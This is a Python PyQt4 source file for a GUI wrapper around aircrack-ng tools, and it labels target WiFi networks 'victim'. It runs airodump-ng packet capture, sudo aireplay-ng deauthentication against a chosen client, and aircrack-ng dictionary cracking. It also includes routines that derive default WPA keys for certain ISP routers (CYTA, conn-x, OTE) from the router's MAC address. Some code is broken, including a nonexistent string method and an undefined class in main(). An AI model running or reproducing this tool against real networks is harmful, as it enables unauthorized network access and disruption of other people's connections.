import subprocess
import os
import commands
import time
import re
import fileinput

from threading import Thread
from system_functions import *
from PyQt4 import QtGui, QtCore
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from asg import Ui_Main_window


class Client(QDialog):
    def __init__(self,victim, parent=None):
        self.bssid = victim[1]
        self.victim = victim
        self.essid = victim[0]
        self.channel = victim[2]
        super(Client, self).__init__(parent)

        self.le = QLineEdit()
        self.le.setObjectName("host")

        self.pb = QPushButton()
        self.pb.setObjectName("connect")
        self.pb.setText("Connect") 

        self.sd = QPushButton()
        self.sd.setObjectName("start_deauth")
        self.sd.setText("Start Deauthentication")

        self.cy = QPushButton()
        self.cy.setObjectName("cyta_crack")
        self.cy.setText("Try Cyta Crack")

        self.nf = QPushButton()
        self.nf.setObjectName("NetFaster_crack")
        self.nf.setText("Try NetFaster crack 'Handshake Required'")

        self.ad = QPushButton()
        self.ad.setObjectName("airodump")
        self.ad.setText("Do airodump in that network")

        layout = QFormLayout()
        layout.addWidget(self.le)
        layout.addWidget(self.ad)
        layout.addWidget(self.pb)
        layout.addWidget(self.sd)
        layout.addWidget(self.cy)
        layout.addWidget(self.nf)

        self.setLayout(layout)
        self.connect(self.pb, SIGNAL("clicked()"),self.set_client)
        self.connect(self.sd, SIGNAL("clicked()"),self.start_deauthentication)
        self.connect(self.cy, SIGNAL("clicked()"),self.cyta_crack)
        self.connect(self.nf, SIGNAL("clicked()"),self.NetFaster_crack)
        self.connect(self.ad, SIGNAL("clicked()"),self.start_airodump_capture)
        self.setWindowTitle("Learning")


    def start_airodump_capture(self):
        self.airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' -w output mon0'
        ct = Command_thread(str(self.airodump_capture))
        ct.start()

    def NetFaster_crack(self):
        generate_NetFaster_keyfile(self.bssid)
        crack_netfaster = 'aircrack-ng -b ' + self.bssid + ' -w netfasterkeys.txt output*.cap'
        ct = Command_thread(str(crack_netfaster))
        ct.start()


    def closeEvent(self, event):
        thr = RetardedKill("airodump-ng", 0)
        thr.start()
        self.victim[:] = []
        event.accept()


    def set_client(self):
        # shost is a QString object
        self.client = self.le.text()
        print 'provided client mac is ' + self.client 
        
    def start_deauthentication(self):
        thr = RetardedKill("aireplay-ng", 10)
        thr.start()

        deauth = 'sudo aireplay-ng -0 10 -a ' + self.bssid + ' -c ' + self.client + ' --ignore-negative-one mon0'
        ct = Command_thread(str(deauth))
        ct.start()

    def cyta_crack(self): 
        self.cyta_bases = 'bases.lst'
        self.bssid = str(self.bssid)   
        self.bssid_ventor = self.bssid[0:8] 
        self.bssid_serial = self.bssid[9:17] 
        self.keyfound = False
        for fline in fileinput.input(self.cyta_bases):
            if self.keyfound == True:
                break

            self.fvendor = fline[0:8]     
            self.fserial_start = fline[9:17]
            self.fserial_end = fline[18:26]
            self.fserial_num = fline[27:33]
            self.fbase = fline[34:40]
            self.finc = fline[41]
            
            if(self.bssid_ventor == self.fvendor and self.fserial_start <= self.bssid_serial <= self.fserial_end):   
                self.keyfound = True
                self.bssid_serial = self.bssid_serial.replace(':','')
                self.fserial_num = self.fserial_num.replace(' ','')  
                self.bssid_serial = int(self.bssid_serial,16)
                self.fbase = int(self.fbase,16)
                self.finc = int(self.finc)
                self.lserial = self.bssid_serial - self.fbase
                self.lserial = self.lserial / self.finc
                self.lserial = str(self.lserial)
                self.cc = len(self.lserial)
                self.zeros = (7 - self.cc)
                self.i = 0
                while(self.i < self.zeros): 
                    self.lserial = "0" + self.lserial
                    self.i = self.i + 1
                            
                print "*********************************"
                print "* Key found:                    *"
                print "* MAC = ",self.bssid,"     *"
                print "* WPA = ",self.fserial_num + "" + self.lserial ,"         *"
                print "*                               *"
                print "*********************************"

        if(self.keyfound == False):
            print 'Key is not in the list'




class Main_window_ex(QMainWindow, Ui_Main_window):
    
    def __init__(self, parent = None):
        """
        Default Constructor. It can receive a top window as parent. 
        """
        QMainWindow.__init__(self, parent)
        self.setupUi(self)
        self.table_networks.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows)

        self.start_procedure_is_pressed = False
        self.device_interface = str()
        self.device_mac = str()
        self.output = list()
        self.victim = list()
        self.essid = str()
        self.bssid = str()
        self.channel = str()


    def closeEvent(self, event):
        reply = QtGui.QMessageBox.question(self, 'Message',
            "Are you sure to quit?", QtGui.QMessageBox.Yes | 
            QtGui.QMessageBox.No, QtGui.QMessageBox.No)

        if reply == QtGui.QMessageBox.Yes:
            if self.start_procedure_is_pressed == True:
                disable_monitor_mode(self.device_interface)                             #[SUCCESS]
                start_network_manager()                                                 #[SUCCESS]
                commands.getstatusoutput('rm wifi-scan*')
                commands.getstatusoutput('rm output*')
            print 'programm exit: SUCCESS'
            event.accept()
        else:
            event.ignore()

    def check_network(self):
        self.victim[:] = []

        for idx in self.table_networks.selectedIndexes():
            self.victim.append(idx.data().toString()) 

        self.encryption = str(self.victim[4])
        self.essid = str(self.victim[0])
        self.bssid = str(self.victim[1])
        self.channel = str(self.victim[2])

        if self.encryption == 'OPN':
            print 'The network is open. Go connect! :)'

        elif self.encryption == 'WEP':
            get_wpe_capture_file(self.essid, self.bssid, self.channel, self.device_mac)

        elif self.encryption == 'WPA' or self.encryption == 'WPA2' or self.encryption == 'WPA2WPA':
            self.w = Client(self.victim)
            self.w.setGeometry(QRect(100, 100, 400, 200))
            
            if self.essid[0:5] == 'CYTA':
                self.w.show()
                
            elif self.essid[0:9] == 'NetFaster':
                self.w.show()
            elif self.essid[0:8] == 'Thomson' or self.essid[0:10] == 'speedtouch':
                print 'Thomnson crack not Implemented yet'
                
            elif self.essid[0:6] == 'conn-x':
                if self.essid[6:12] == self.bssid[9:17].replace(':','').lower():
                    print 'key is ' + self.bssid.replace(':','').lower()
            elif self.essid[0:4] ==  'OTE':
                if self.essid[4:11] == self.bssid[9:17].replace(':','').tolower():
                    print 'key is ' + self.bssid.replace(':','').lower()
            else:
                print 'Couldn\'t fing known network. We\' get the Handshake though!'
                self.w.show()

        else:
            print 'Error: Can\'t find the encryption of the network'

    def scan_process(self):
        sender = self.sender()
        self.statusBar().showMessage('Process started')
        if self.start_procedure_is_pressed == True:
            rescan(self)
        else:
            first_scan(self)


def main():
    import sys
    app = QtGui.QApplication(sys.argv)
    ex = AircrackUI()
    sys.exit(app.exec_())


if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    ui = Main_window_ex()
    ui.show()
    sys.exit(app.exec_())

